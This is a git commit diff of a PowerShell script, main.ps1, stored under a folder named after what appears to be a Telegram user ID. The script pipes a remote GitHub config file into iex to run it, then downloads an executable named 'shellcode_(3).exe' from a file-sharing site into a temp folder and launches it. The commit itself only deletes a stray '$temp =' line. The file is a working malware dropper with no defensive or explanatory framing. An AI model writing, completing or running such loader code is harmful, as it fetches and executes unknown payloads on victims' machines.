2a8899b83db83a7e0f87e7e96e73525b62f70564
43a1723 <hai1723notgay@gmail.com>
2024-07-01 16:30:59 +0700

    Update main.ps1

--- usertelegram/1086990476411932722/main.ps1
+++ usertelegram/1086990476411932722/main.ps1
@@ -1,5 +1,4 @@
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/usertelegram/config.ps1" -useb)
 
-$temp =
 Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
 Start-Process -FilePath "$temp\s.exe"
